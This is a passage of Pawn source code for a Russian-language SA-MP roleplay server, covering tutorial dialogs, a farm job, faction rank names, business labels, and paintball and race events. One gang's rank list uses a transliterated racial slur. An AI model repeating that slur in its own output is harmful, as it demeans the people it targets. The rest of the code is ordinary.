			strcat(string,"Чтобы напечатать сообщение нажмите клавишу \"F6\" или \"T\"(на латинеце).\n");
			strcat(string,"Так же с помощью чата используются все команды сервера, к примеру \"/mm\".\n\n\n");
			strcat(string,"Используйте \"/mm\" для просмотра команд...\n");
			strcat(string,"Более подробное описание вы найдете на нашем сайте");
			return ShowPlayerDialogEx(playerid, 1467, 0,"Общение",string,"Далее","Меню");
		}
	case 2:
		{
			strcat(string,"<< Список игроков >>\n\n");
			strcat(string,"Данный список можно посмотреть нажав клавишу \"TAB\".\n");
			strcat(string,"Там вы увидете:\n\n");
			strcat(string,"\"ID\" игрока(используется в командах)\n");
			strcat(string,"\"Ник(РП имя игрока)\"\n");
			strcat(string,"\"Уровень(lvl)\" в графе score(Повышается автоматически каждый отыгранный час)\n");
			strcat(string,"\"Пинг\" это не слишком важно, поэтому я не буду нагружать вас лишней информацией.\n\n");
			strcat(string,"Для просмотра списка полностью, используйте прокрутку с право.\n");
			strcat(string,"Вы в этой табличке всегда отображаетесь первым, независимо от ID.");
			return ShowPlayerDialogEx(playerid, 1467, 0,"Список игроков",string,"Далее","Меню");
		}
	case 3:
		{
			strcat(string,"<< Транспорт >>\n\n");
			strcat(string,"Я надеюсь вы умеете ездить, но даже если нет, наши Авто Инструкторы вас научат.\n");
			strcat(string,"В Автошколу вам придется идти в любом случае, поскольку езда разрешена только\n");
			strcat(string,"с правами. Ну а пока вы можете воспользоваться мотороллером,\n");
			strcat(string,"Или же общественным транспортом\n\n");
			strcat(string,"Для того чтобы сесть на пассажирское место используйте клавишу \"G\"");
			return ShowPlayerDialogEx(playerid, 1467, 0,"Транспорт",string,"Далее","Меню");
		}
	case 4:
		{
			strcat(string,"<< Общее >>\n\n");
			strcat(string,"Играя на сервере ваш лвл повышается автоматически.\n");
			strcat(string,"После получения определенного левла открываются новые возможности\n\n");
			strcat(string,"Но уровень персонажа не главное! На нашем сервере можно зарабатывать\n");
			strcat(string,"деньги, после покупать дома, машины и т.д Можно вступить в банду и воевать за\n");
			strcat(string,"территории, тем самым расширяя бизнес. Или стать членом мафии.\n\n");
			strcat(string,"Можно работать полицейским защищая гражданских. И это только малая часть доступного!");
			return ShowPlayerDialogEx(playerid, 1467, 0,"Общее",string,"Далее","Меню");
		}
	case 5:
		{
			strcat(string,"<< Транспорт >>\n\n");
			strcat(string,"Для управления автомобилем необходимы водительские права, а для пилотирования самолета\n");
			strcat(string,"лицензия пилота. Транспорту нужен бензин, которым можно заправиться на любой заправке.\n");
			strcat(string,"При нарушении Правил дорожного движения(превышение скорости...), вас могут оштрафовать.\n\n");
			strcat(string,"<< Работа >>\n\n");
			strcat(string,"Многие профессии доступны каждому гражданскому. Устроиться на работу можно в Мэрии.\n");
			strcat(string,"К примеру Водитель автобуса, Таксист, Механик.");
			return ShowPlayerDialogEx(playerid, 1467, 0,"Транспорт часть 2",string,"Далее","Меню");
		}
	case 6:
		{
			strcat(string,"<< Оружие и Убийство >>\n\n");
			strcat(string,"Для ношения оружия необходима лицензия, без нее вас не впустят в магазин.\n");
			strcat(string,"Но оружие можно достать и другими способами.\n\n");
			strcat(string,"За убийcтво человека вы будете объявлены в розыск, как опасный преступник,\n");
			strcat(string,"а при аресте вы лишитесь крупной суммы денег и сядете в тюрьму!\n");
			strcat(string,"Изначально ваши навыки владения оружием будут малы, но со временем вы сможете\n");
			strcat(string,"стать элитным стрелком, и относиться к вам будут с уважением!");
			return ShowPlayerDialogEx(playerid, 1467, 0,"Оружие и Убийство",string,"Далее","Меню");
		}
	case 7:
		{
			strcat(string,"Role Play - Ролевая игра, игра по ролям.\n");
			strcat(string,"Я объясню более понятно. Вам предоставлены уже готовые роли, к примеру\n");
			strcat(string,"Бандит, Полицейский.\n");
			strcat(string,"Состоя в банде вы продаете наркотики, оружие. Грабите военные склады и т.п.\n");
			strcat(string,"Состоя в Полиции вы следите за порядком, и пытаетесь посадить тех же бандитов.\n");
			strcat(string,"Если вам не нравиться выше написанное, то можете стать к примеру репортером, и\n");
			strcat(string,"вести собственную передачу по радио.");
			return ShowPlayerDialogEx(playerid, 1467, 0,"Role Play",string,"Далее","Меню");
		}
	case 8:
		{
			strcat(string,"<< Первые шаги (Первые деньги) >>\n\n");
			strcat(string,"Вам потребуются деньги, заработать немного денег вы можете на заводе, работая грузчиком.\n");
			strcat(string,"Добраться на завод вы можете на автобусе \'Внутригородской LS\' или на такси,\n");
			strcat(string,"таксист отвезет вас бесплатно, просто сядьте в свободное такси.\n");
			return ShowPlayerDialogEx(playerid, 1467, 0,"Первые шаги",string,"Далее","Меню");
		}
	case 9:
		{
			strcat(string,"<< Первые шаги (Водительские права) >>\n\n");
			strcat(string,"Как только вы заработаете немного денег, отправляйтесь в автошколу.\n");
			strcat(string,"Автошкола находиться в Сан Фиерро (2ой город).\n");
			strcat(string,"Стоимость сдачи экзамена состовляет 500 вирт.\n");
			strcat(string,"Добраться вы можете на автобусе \'Лос Сантос - Сан Фиерро\'.");
			return ShowPlayerDialogEx(playerid, 1467, 0,"Первые шаги часть 2",string,"Далее","Меню");
		}
	case 10:
		{
			strcat(string,"<< Первые шаги (Постоянная работа) >>\n\n");
			strcat(string,"После того как вы заработаете денег и получите права,\n");
			strcat(string,"вы сможете устроиться на официальную работу.\n");
			strcat(string,"Устроиться на работу, и ознакомиться со списком профессий, вы можете в мэрии.\n");
			strcat(string,"Добирайтесь на \'Внутригородском LS\'");
			return ShowPlayerDialogEx(playerid, 1467, 0,"Первые шаги часть 3",string,"Далее","Меню");
		}
	case 11:
		{
			strcat(string,"<< Часовая зарплата >>\n\n");
			strcat(string,"Каждый час в 00 игроки получают банковский чек, в котором указаны все доходы и\n");
			strcat(string,"расходы.\n");
			strcat(string,"Доходы: Зарплата с работы.\n");
			strcat(string,"Расходы: Налог государству (после 5 лвл), Счет за телефон (если вы звонили),\n");
			strcat(string,"Кварплата (если вы владелец дома).");
			return ShowPlayerDialogEx(playerid, 1467, 0,"Часовая зарплата",string,"Далее","Меню");
		}
	case 12:
		{
			strcat(string,"<< Зарплата фракции >>\n\n");
			strcat(string,"В некоторых фракциях вы получаете Зарплату каждый час от государства.\n");
			strcat(string,"В других эта зарплата выдается лидером. Все организации на сервере имеют\n");
			strcat(string,"свой заработок. Где то нелегальный бизнес, где то постоянная зарплата.\n\n");
			strcat(string,"Банды: Бизнес(Нелегальный), Оружие и Наркотики, Ограбление.\n");
			strcat(string,"Репортеры: Бизнес(Легальный), Реклама.\n");
			strcat(string,"Мэрия: От адвоката до Управления казной.");
			return ShowPlayerDialogEx(playerid, 1467, 0,"Зарплата фракции",string,"Далее","Меню");
		}
	case 13:
		{
			strcat(string,"<< Бизнес >>\n\n");
			strcat(string,"Все клубы, бары, забегаловки являются бизнесами, которые можно арендовать.\n");
			strcat(string,"По мимо этого еще есть Бензоправки и Магазины.\n");
			strcat(string,"Чтобы заработать на бизнесе нужен начальный капитал. Для лицензии,\n");
			strcat(string,"Аренды помещения, Продуктов.");
			return ShowPlayerDialogEx(playerid, 1467, 0,"Бизнес",string,"Далее","Меню");
		}
	case 14:
		{
			strcat(string,"<< Местность >>\n\n");
			strcat(string,"Лос Сантос(1 город) самый опасный город, так как здесь большое количество\n");
			strcat(string,"бандитов. Районы банд выделены на карте особыми цветами, но только там\n");
			strcat(string,"можно купить оружие по дешевле и ни кто не спросит у вас лицензии\n\n");
			strcat(string,"Сан Фиерро(2 город). Если не хотите каждый день сталкиваться с беззаконием,\n");
			strcat(string,"то поселитесь в этом городе.\n\n");
			strcat(string,"Лас Вентурас(3 город). Город азарта, город богачей. Конечно здесь не такие раскошные\n");
			strcat(string,"особняки как на VINEWOOD, но улицы самые красивые.");
			return ShowPlayerDialogEx(playerid, 1467, 0,"Местность",string,"Далее","Меню");
		}
	case 15:
		{
			strcat(string,"<< Законопослушность >>\n\n");
			strcat(string,"У каждого игрока есть индикатор, который показывает как вы относитесь к закону.\n");
			strcat(string,"-100 и +100 Минимум и максимум. Узнать можно заглянув в ваш пасспорт \"/showpass [ид]\"\n");
			strcat(string,"С плохим отношением к закону вас могут не принять во многии Фракции, но в банду\n");
			strcat(string,"попасть легче.\n\n");
			strcat(string,"Законопослушность повышается каждый час на 1, однако может резко упасть если\n");
			strcat(string,"совершите преступление");
			return ShowPlayerDialogEx(playerid, 1467, 0,"Законопослушность",string,"Далее","Меню");
		}
	case 16:
		{
			strcat(string,"<< Дома >>\n\n");
			strcat(string,"Вы можете в любой момент купить себе дом, тогда при смерти или входе в игру\n");
			strcat(string,"вы будете появляться там. По мимо этого у вас появиться место для парковки машины,\n");
			strcat(string,"а значит вы можете купить себе красивое авто.\n");
			strcat(string,"Дома поделенны по классам - [Nope] [D] [C] [B] [A] [S]. Класс говорит о цене и красоте\n");
			strcat(string,"дома как внутри, так и снаружи.");
			return ShowPlayerDialogEx(playerid, 1467, 0,"Дома",string,"Далее","Меню");
		}
	case 17:
		{
			strcat(string,"После покупки дома с вашего банковского счета будут сниматься Кварплата, она зависит от класса дома.\n");
			strcat(string,"Важное примечание! Деньги снимаются каждый час даже когда вы оффлайн.\n\n");
			strcat(string,"<< Личный транспорт >>\n\n");
			strcat(string,"У нас есть несколько Автосалонов, где вы можете приобрести себе машину. Все они\n");
			strcat(string,"указаны в \"/GPS\". Транспорт как и дома разделены по классам.\n");
			strcat(string,"Чтобы выбрать себе машину, воспользуйтесь командой \"/Buycar\". Далее вы\n");
			strcat(string,"увидете подсказку по клавишам с правой стороны, а снизу цену и цвет.");
			return ShowPlayerDialogEx(playerid, 1467, 0,"Дома часть 2",string,"Далее","Меню");
		}
	}
	return true;
}
publics: Farmduty(playerid)
{
	DisablePlayerRaceCheckpoint(playerid);
	SetVehicleParamsEx(GetPlayerVehicleID(playerid),false,false,false,false,false,false,false);
	new Float:X12, Float:Y12, Float:Z12;
	new carid = GetPlayerVehicleID(playerid);
	SetVehicleVelocity(carid, 0.0, 0.0, 0.0);
	GetVehiclePos(carid, X12, Y12, Z12);
	GetXYInBackOfPlayer(playerid, X12, Y12,3.0);
	Farmcar_pickup[GetPlayerVehicleID(playerid)] = CreatePickupAC(19197,23,X12,Y12,Z12+0.3);
	format(string, sizeof(string), "Загружено\n{ffffff}%d / 1000",Farmcar_prods[GetPlayerVehicleID(playerid)]);
	Farmcar_text[GetPlayerVehicleID(playerid)] = Create3DTextLabel(string, 0x5CABBDAA, X12, Y12, Z12+1.0, 40.0, 0, 0);
	Farmcar_works[GetPlayerVehicleID(playerid)] = true;
	SCM(playerid, 0x0073B7AA, " Машина на месте. Теперь вы и и ваши рабочие могут загружать ее");
	SCM(playerid, 0x0073B7AA, " Если решите завершить сбор урожая, сядьте снова в машину");
	RemovePlayerFromVehicleAC(playerid);
	TogglePlayerControllable(playerid, 1);
	return true;
}
publics: FarmDuty(playerid)
{
	DeletePVar(playerid,"farm_status");
	if(!FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain_Sown]) return SCM(playerid,COLOR_RED,"На поле недостаточно урожая");
	if(FarmInfo[GetPVarInt(playerid,"farm_id")][fBank] < FarmInfo[GetPVarInt(playerid,"farm_id")][fZp]) return SCM(playerid,COLOR_RED,"На балансе фермы недостаточно средств");
	if(IsPlayerInCheckpoint(playerid))
	{

		SetPVarInt(playerid,"farm_status",2);
		SetPlayerAttachedObject(playerid, 3, 856, 6, 0.086999, 0.036999, 0.000000, 0.000000, 0.000000, 0.000000, 0.010999, 0.009000, 0.085999);
		TogglePlayerControllable(playerid, 1);
		ClearAnim(playerid);
		oldpickup[playerid] = -1;
		KillTimer(Farmtimer[playerid]);
		DisablePlayerCheckpoint(playerid);
	}
	return true;
}
public OnPlayerSelectObject(playerid, type, objectid, modelid, Float:fX, Float:fY, Float:fZ) return EditObject(playerid,objectid);
public OnPlayerEditDynamicObject( playerid, objectid, response, Float:x, Float:y, Float:z, Float:rx, Float:ry, Float:rz )
{
	if(response) SetDynamicObjectPos(objectid,x, y, z), SetDynamicObjectRot(objectid,rx,ry,rz);
	if(response == 1) SendMes(playerid,-1," Позиция объекта изменена. [X: %.2f] [Y: %.2f] [Z: %.2f] [RX: %.2f] [RY: %.2f] [RZ: %.2f]",x,y,z,rx,ry,rz);
	return true;
}
public OnPlayerSelectDynamicObject(playerid, objectid, modelid, Float:x, Float:y, Float:z) return EditDynamicObject(playerid,objectid);
public OnPlayerEditObject( playerid, playerobject, objectid, response, Float:fX, Float:fY, Float:fZ, Float:fRotX, Float:fRotY, Float:fRotZ )
{
	if(response) SetObjectPos(objectid,fX,fY,fZ), SetObjectRot(objectid,fRotX,fRotY,fRotZ);
	if(response == 1) SendMes(playerid,-1," Позиция объекта изменена. [X: %.2f] [Y: %.2f] [Z: %.2f] [RX: %.2f] [RY: %.2f] [RZ: %.2f]",fX,fY,fZ,fRotX,fRotY,fRotZ);
	return true;
}
stock GetRank(targetid)
{
	new rangz[40];
	switch(PlayerInfo[targetid][pMember])
	{
	case 0: rangz = "";
	case 1,10,21:
		{
			switch(PlayerInfo[targetid][pRank])
			{
			case 14: { rangz = "Шериф"; }
			case 13: { rangz = "Полковник"; }
			case 12: { rangz = "Подполковник";}
			case 11: { rangz = "Майор"; }
			case 10: { rangz = "Капитан"; }
			case 9: { rangz = "Ст. Лейтенант"; }
			case 8: { rangz = "Лейтенант"; }
			case 7: { rangz = "Мл. Лейтенант"; }
			case 6: { rangz = "Ст. Прапорщик"; }
			case 5: { rangz = "Прапорщик"; }
			case 4: { rangz = "Сержант"; }
			case 3: { rangz = "Мл. Сержант"; }
			case 2: { rangz = "Офицер"; }
			case 1: { rangz = "Кадет"; }
			}
		}
	case 2:
		{
			switch(PlayerInfo[targetid][pRank])
			{
			case 10: { rangz = "Директор FBI"; }
			case 9: { rangz = "Зам.Директора FBI"; }
			case 8: { rangz = "Инспектор FBI"; }
			case 7: { rangz = "Глава CID"; }
			case 6: { rangz = "Глава GNK"; }
			case 5: { rangz = "Агент CID"; }
			case 4: { rangz = "Агент GNK"; }
			case 3: { rangz = "Мл.Агент"; }
			case 2: { rangz = "Дежурный"; }
			case 1: { rangz = "Стажёр"; }
			}
		}
	case 19:
		{
			switch(PlayerInfo[targetid][pRank])
			{
			case 15: { rangz = "Генерал"; }
			case 14: { rangz = "Полковник"; }
			case 13: { rangz = "Подполковник"; }
			case 12: { rangz = "Майор";}
			case 11: { rangz = "Капитан"; }
			case 10: { rangz = "Старший лейтенант"; }
			case 9: { rangz = "Лейтенант"; }
			case 8: { rangz = "Младший лейтенант"; }
			case 7: { rangz = "Прапорщик"; }
			case 6: { rangz = "Старшина"; }
			case 5: { rangz = "Ст. Сержант"; }
			case 4: { rangz = "Сержант"; }
			case 3: { rangz = "Мл. Сержант"; }
			case 2: { rangz = "Ефрейтор"; }
			case 1: { rangz = "Рядовой"; }
			}
		}
	case 3:
		{
			switch(PlayerInfo[targetid][pRank])
			{
			case 15: { rangz = "Адмирал"; }
			case 14: { rangz = "Вице-Адмирал"; }
			case 13: { rangz = "Контр-Адмирал"; }
			case 12: { rangz = "Каптин 1-го ранга";}
			case 11: { rangz = "Капитан-Лейтенант"; }
			case 10: { rangz = "Ст.Лейтенант"; }
			case 9: { rangz = "Лейтенант"; }
			case 8: { rangz = "Мл.Лейтенант"; }
			case 7: { rangz = "Ст.Мичман"; }
			case 6: { rangz = "Мичман"; }
			case 5: { rangz = "Мл.Мичман"; }
			case 4: { rangz = "Старшина"; }
			case 3: { rangz = "Ст.Матрос"; }
			case 2: { rangz = "Матрос"; }
			case 1: { rangz = "Юнга"; }
			}
		}
	case 4,22,33:
		{
			switch(PlayerInfo[targetid][pRank])
			{
			case 10: { rangz = "Глав.Врач"; }
			case 9: { rangz = "Зам Глав.Врача"; }
			case 8: { rangz = "Хирург"; }
			case 7: { rangz = "Психолог"; }
			case 6: { rangz = "Доктор"; }
			case 5: { rangz = "Нарколог"; }
			case 4: { rangz = "Спасатель"; }
			case 3: { rangz = "Мед.Брат"; }
			case 2: { rangz = "Санитар"; }
			case 1: { rangz = "Интерн"; }
			}
		}
	case 5:
		{
			switch(PlayerInfo[targetid][pRank])
			{
			case 10: { rangz = "Дон"; }
			case 9: { rangz = "Консильери"; }
			case 8: { rangz = "Младший Босс"; }
			case 7: { rangz = "Капо"; }
			case 6: { rangz = "Сотто-Капо"; }
			case 5: { rangz = "Боец"; }
			case 4: { rangz = "Солдато"; }
			case 3: { rangz = "Сомбаттенте"; }
			case 2: { rangz = "Ассосиато"; }
			case 1: { rangz = "Новицио"; }
			}
		}
	case 6:
		{
			switch(PlayerInfo[targetid][pRank])
			{
			case 10: { rangz = "Кумите"; }
			case 9: { rangz = "Оядзи"; }
			case 8: { rangz = "Cайко-Комон"; }
			case 7: { rangz = "Камбу"; }
			case 6: { rangz = "Со-Хомбуте"; }
			case 5: { rangz = "Вагакасира"; }
			case 4: { rangz = "Фуку-Комбуте"; }
			case 3: { rangz = "Кедай"; }
			case 2: { rangz = "Сятей"; }
			case 1: { rangz = "Вакасю"; }
			}
		}
	case 7:
		{
			switch(PlayerInfo[targetid][pRank])
			{
			case 6: { rangz = "Мэр"; }
			case 5: { rangz = "Зам. мэра"; }
			case 4: { rangz = "Начальник охраны"; }
			case 3: { rangz = "Охранник"; }
			case 2: { rangz = "Адвокат"; }
			case 1: { rangz = "Секретарь"; }
			}
		}
	case 9,16,20:
		{
			switch(PlayerInfo[targetid][pRank])
			{
			case 10: { rangz = "Ген.Директор"; }
			case 9: { rangz = "Програмный директор"; }
			case 8: { rangz = "Тех.Директор"; }
			case 7: { rangz = "Гл.Редактор"; }
			case 6: { rangz = "Редактор"; }
			case 5: { rangz = "Ведущий"; }
			case 4: { rangz = "Репортер"; }
			case 3: { rangz = "Звукорижессер"; }
			case 2: { rangz = "Звукооператор"; }
			case 1: { rangz = "Стажер"; }
			}
		}
	case 11:
		{
			switch(PlayerInfo[targetid][pRank])
			{
			case 10: { rangz = "Управляющий"; }
			case 9: { rangz = "Директор"; }
			case 8: { rangz = "Ст.Менеджер "; }
			case 7: { rangz = "Мл.Менеджер"; }
			case 6: { rangz = "Кординатор"; }
			case 5: { rangz = "Инструктор"; }
			case 4: { rangz = "Мл.Инструктор"; }
			case 3: { rangz = "Экзаменатор"; }
			case 2: { rangz = "Консультант"; }
			case 1: { rangz = "Стажёр"; }
			}
		}
	case 12:
		{
			switch(PlayerInfo[targetid][pRank])
			{
			case 10: { rangz = "Биг Вилли"; }
			case 9: { rangz = "Райч Нига"; }
			case 8: { rangz = "Фолкс"; }
			case 7: { rangz = "Федерал Блок"; }
			case 6: { rangz = "Гангстер"; }
			case 5: { rangz = "Ап Бро"; }
			case 4: { rangz = "Гун брo"; }
			case 3: { rangz = "Крэкер"; }
			case 2: { rangz = "Младший Нига"; }
			case 1: { rangz = "Блайд"; }
			}
		}
	case 26:
		{
			switch(PlayerInfo[targetid][pRank])
			{
			case 9: { rangz = "Президент"; }
			case 8: { rangz = "Вице президент"; }
			case 7: { rangz = "Treasurer"; }
			case 6: { rangz = "Sergeant-at-arms"; }
			case 5: { rangz = "Road captain"; }
			case 4: { rangz = "Member"; }
			case 3: { rangz = "Prospect"; }
			case 2: { rangz = "Hang around"; }
			case 1: { rangz = "Support"; }
			}
		}
	case 24:
		{
			switch(PlayerInfo[targetid][pRank])
			{
			case 9: { rangz = "Президент"; }
			case 8: { rangz = "Вице президент"; }
			case 7: { rangz = "Treasurer"; }
			case 6: { rangz = "Sergeant-at-arms"; }
			case 5: { rangz = "Road captain"; }
			case 4: { rangz = "Member"; }
			case 3: { rangz = "Prospect"; }
			case 2: { rangz = "Hang around"; }
			case 1: { rangz = "Support"; }
			}
		}
	case 29:
		{
			switch(PlayerInfo[targetid][pRank])
			{
			case 9: { rangz = "Президент"; }
			case 8: { rangz = "Вице президент"; }
			case 7: { rangz = "Treasurer"; }
			case 6: { rangz = "Sergeant-at-arms"; }
			case 5: { rangz = "Road captain"; }
			case 4: { rangz = "Member"; }
			case 3: { rangz = "Prospect"; }
			case 2: { rangz = "Hang around"; }
			case 1: { rangz = "Support"; }
			}
		}
	case 13:
		{
			switch(PlayerInfo[targetid][pRank])
			{
			case 10: { rangz = "Падре"; }
			case 9: { rangz = "Падрино"; }
			case 8: { rangz = "Лидер V.E.G."; }
			case 7: { rangz = "Ассесино"; }
			case 6: { rangz = "V.E.G."; }
			case 5: { rangz = "Бандито"; }
			case 4: { rangz = "Верификадо"; }
			case 3: { rangz = "Локал"; }
			case 2: { rangz = "Ординарио"; }
			case 1: { rangz = "Новатто"; }
			}
		}
	case 14:
		{
			switch(PlayerInfo[targetid][pRank])
			{
			case 10: { rangz = "Авторитет"; }
			case 9: { rangz = "Вор в законе"; }
			case 8: { rangz = "Вор"; }
			case 7: { rangz = "Браток"; }
			case 6: { rangz = "Свояк"; }
			case 5: { rangz = "Блатной"; }
			case 4: { rangz = "Барыга"; }
			case 3: { rangz = "Бык"; }
			case 2: { rangz = "Фраер"; }
			case 1: { rangz = "Шнырь"; }
			}
		}
	case 15:
		{
			switch(PlayerInfo[targetid][pRank])
			{
			case 10: { rangz = "Мэд Дог"; }
			case 9: { rangz = "Легенд"; }
			case 8: { rangz = "Де Кинг"; }
			case 7: { rangz = "Мобста"; }
			case 6: { rangz = "О.Г."; }
			case 5: { rangz = "Гангста"; }
			case 4: { rangz = "Юонг"; }
			case 3: { rangz = "Килла"; }
			case 2: { rangz = "Хастла"; }
			case 1: { rangz = "Плэйя"; }
			}
		}
	case 17:
		{
			switch(PlayerInfo[targetid][pRank])
			{
			case 10: { rangz = "Падре"; }
			case 9: { rangz = "Нестро"; }
			case 8: { rangz = "Тесосеро"; }
			case 7: { rangz = "Инвасор"; }
			case 6: { rangz = "Сабио"; }
			case 5: { rangz = "Мирандо"; }
			case 4: { rangz = "Лас Геррас"; }
			case 3: { rangz = "Геттор"; }
			case 2: { rangz = "Тирадор"; }
			case 1: { rangz = "Перро"; }
			}
		}
	case 18:
		{
			switch(PlayerInfo[targetid][pRank])
			{
			case 10: { rangz = "Падре"; }
			case 9: { rangz = "Аджунто"; }
			case 8: { rangz = "Ауторидад"; }
			case 7: { rangz = "Бандидо"; }
			case 6: { rangz = "Эрмано"; }
			case 5: { rangz = "Джуниор"; }
			case 4: { rangz = "Мачo"; }
			case 3: { rangz = "Амиго"; }
			case 2: { rangz = "Ладрон"; }
			case 1: { rangz = "Новато"; }
			}
		}
	default: rangz = "Нет";
	}
	return rangz;
}
stock UpdateBizz(x)
{
	if(BizzInfo[x][bType] != 4)
	{
		if(strcmp(BizzInfo[x][bOwner],"None",true) == 0) format(string, 90, "%s\nПродаётся", BizzInfo[x][bMessage], BizzInfo[x][bBuyPrice]), BizzInfo[x][bLocked] = 1;
		else format(string,128, "%s\nВладелец:\n%s", BizzInfo[x][bMessage], BizzInfo[x][bOwner]);
	}
	else
	{
		if(strcmp(BizzInfo[x][bOwner],"None",true) == 0) format(string, 90, "%s\nПродаётся", BizzInfo[x][bMessage],BizzInfo[x][bBuyPrice]), BizzInfo[x][bLocked] = 1;
		else format(string,128, "%s\nВладелец:\n%s\nЦена бензина: %i вирт", BizzInfo[x][bMessage], BizzInfo[x][bOwner],BizzInfo[x][bPrice]);
	}
	UpdateDynamic3DTextLabelText(BizzInfo[x][bLabel], COLOR_GREEN, string);
	return true;
}
stock GetPaintball()
{
	new null[3];
	paint_info[0]--;
	if(paint_info[1] == 1 && paint_info[0] == 120) SendClientMessageToAll(0xffaaffff," Внимание! Начало пейнтбола через 2 минуты. Место проведения: военный завод K.A.C.C.");
	if(paint_info[1] == 1 && paint_info[0] == 1)
	{
		foreach(i) if(GetPVarInt(i,"player_paint")) null[2]++;
		if(null[2] > 2)
		{
			Painlist = 0;
			SendClientMessageToAll(0xffaaffff," Внимание! Пейнтболл начался");
			paint_info[1] = 2; paint_info[0] = 300;
			foreach(x) if(GetPVarInt(x, "player_paint") == 1) SetPVarInt(x, "player_paint", 2), SpawnPlayer(x);
		}
		else SendClientMessageToAll(0xffaaffff," Внимание! Пейнтбол был прерван из-за отсутствия участников"), paint_info[1] = 0, paint_info[0] = 0;
	}
	else if(paint_info[1] == 2 && paint_info[0] == 1)
	{
		SendClientMessageToAll(0xffaaffff," Внимание! Пейнтбол окончен. (( Список победителей: /painlist ))");
		paint_info[1] = 0; paint_info[0] = 0, null[2] = 0;
		foreach(x)
		{
			if(GetPVarInt(x, "player_paint") == 2)
			{
				PaintStats[Painlist][paKills] = GetPVarInt(x,"paintkills");
				PaintStats[Painlist][paDeaths] = GetPVarInt(x,"paintdeaths");
				strmid(PaintStats[Painlist][paName],Name(x), 0, strlen(Name(x)), 32);
				Painlist++;
				if(GetPVarInt(x,"paintkills") > null[0]) null[0] = GetPVarInt(x,"paintkills"); null[1] = x;
				DelGun(x);
				SetPlayerPos(x, 286.1364,-30.7176,1001.5156);
				SetPlayerFacingAngle(x, 181.0381);
				SetPlayerVirtualWorld(x, 1);
				SetPlayerInterior(x, 1);
			}
			DeletePVar(x,"player_paint");
		}
		if(null[1] != -1)
		{
			switch(booston == 0)
			{
			case 0:
				{
					PlayerInfo[null[1]][pCash]+=5000;
					GameTextForPlayer(null[1],"~g~+$5000", 5000, 1);
					SCM(null[1], TEAM_AZTECAS_COLOR, " Поздравляем вы заняли 1-е место.");
				}
			case 1:
				{
					PlayerInfo[null[1]][pCash]+=15000;
					GameTextForPlayer(null[1],"~g~+$15000", 5000, 1);
					SCM(null[1], TEAM_AZTECAS_COLOR, " Поздравляем вы заняли 1-е место.");
				}
			}
		}
	}
	return true;
}
stock GetRace()
{
	if(race_info[0] > 0)
	{
		race_info[0]--;
		if(race_info[1] == 1 && race_info[0] == 120) SendClientMessageToAll(0xB9B900AA," Внимание! Начало гонок через 2 минуты. Трасса: Аэропорт Лос Сантос. Регистрация у въезда");
		if(race_info[1] == 1 && race_info[0] == 1)
		{
			new null;
			foreach(i) if(GetPVarInt(i,"gonka")) null++;
			if(null >= 3)
			{
				SendClientMessageToAll(0xB9B900AA," Внимание! Гонки начались. Трасса: Аэропорт Лос Сантос");
				race_info[1] = 2; race_info[0] = 10;
				new rand = random(sizeof(RaceCar));
				foreach(x)
				{
					if(GetPVarInt(x, "gonka") == 1)
					{
						RaceInfo[RaceList][rCar] = CreateVehicle(RaceCar[rand], RaceSpawns[RaceList][0], RaceSpawns[RaceList][1], RaceSpawns[RaceList][2], RaceSpawns[RaceList][3], random(128), random(128),7200);
						CarHealth[RaceInfo[RaceList][rCar]] = float(1000);
						Fuell[RaceInfo[RaceList][rCar]] = float(100);
						GetVehicleParamsEx(RaceInfo[RaceList][rCar],engine,lights,alarm,doors,bonnet,boot,objective);
						SetVehicleParamsEx(RaceInfo[RaceList][rCar],1,1,alarm,0,bonnet,boot,objective);
						t_SetPlayerPos(x,RaceSpawns[RaceList][0], RaceSpawns[RaceList][1], RaceSpawns[RaceList][2]);
						PutPlayerInVehicleEx(x, RaceInfo[RaceList][rCar], 0);
						SetPlayerInterior(x, 0);
						SetPlayerVirtualWorld(x, 0);
						RaceList++;
						TogglePlayerControllableEx(x, false);
						SetPVarInt(x, "gonka", RaceList);
					}
				}
				RaceList = 0;
			}
			else
			{
				SendClientMessageToAll(0xB9B900AA," Гонка отменена из - за не достаточного количества участников");
				race_info[1] = 0; race_info[0] = 0;
				foreach(x) DeletePVar(x,"gonka");
			}
		}
		if(race_info[1] == 2 && race_info[0] <= 5) foreach(x) if(GetPVarInt(x, "gonka") > 0) format(string,64,"~g~RACE STARTED~n~~w~%i",race_info[0]), GameTextForPlayer(x,string, 5000, 4);
		if(race_info[1] == 2 && race_info[0] == 1)
		{
			race_info[1] = 3, race_info[0] = 300;
			foreach(x)
			{
				GameTextForPlayer(x,"~g~GO GO GO", 2000, 4);
				TogglePlayerControllableEx(x, true);
				SetPVarInt(x,"gonkaid",0);
				SetPlayerRaceCheckpoint(x, 0, RaceGonka[GetPVarInt(x,"gonkaid")][0],RaceGonka[GetPVarInt(x,"gonkaid")][1],RaceGonka[GetPVarInt(x,"gonkaid")][2],RaceGonka[GetPVarInt(x,"gonkaid")+1][0],RaceGonka[GetPVarInt(x,"gonkaid")+1][1],RaceGonka[GetPVarInt(x,"gonkaid")+1][2], 8.0);
			}
		}
		if(race_info[1] == 3 && race_info[0] == 120) foreach(x) if(GetPVarInt(x,"gonka") > 0) GameTextForPlayer(x,"~g~RACE ENDED TO 2 MIN", 3000, 4);
		if(race_info[1] == 3 && race_info[0] == 1)
		{
			SendClientMessageToAll(0xB9B900AA," Внимание! Гонки окончены. (( Список победителей: /racelist ))");
			race_info[0] = 0, race_info[1] = 0;
			foreach(x)
			{
				if(GetPVarInt(x, "gonka") > 0)
				{
					SetPlayerInterior(x,3);
					SetPlayerPos(x,831.7769,6.8750,1004.1797);
					SetPlayerFacingAngle(x,108.1610);
					DestroyVehicle(RaceInfo[GetPVarInt(x,"gonka")-1][rCar]);
					DeletePVar(x,"gonka");
				}
			}
		}
	}
}
stock UpdateTable(table[], set[], set_, where[], where_)
{
	mysql_format(DATABASE,QUERY,300,"UPDATE `%s` SET %s = %i WHERE %s = %i",table,set,set_,where,where_);
	return mysql_function_query(DATABASE,QUERY,false,"","");
}
stock mktime(hour,minute,second,day,month,year) {
	new timestamp2;

	timestamp2 = second + (minute * 60) + (hour * 3600);

	new days_of_month[12];

	if ( ((year % 4 == 0) && (year % 100 != 0)) || (year % 400 == 0) ) {
		days_of_month = {31,29,31,30,31,30,31,31,30,31,30,31};
	} else {
		days_of_month = {31,28,31,30,31,30,31,31,30,31,30,31};
	}
	new days_this_year = 0;
	days_this_year = day;
	if(month > 1) {
		for(new i=0; i<month-1;i++) {
			days_this_year += days_of_month[i];
		}
	}
	timestamp2 += days_this_year * 86400;

	for(new j=1970;j<year;j++) {
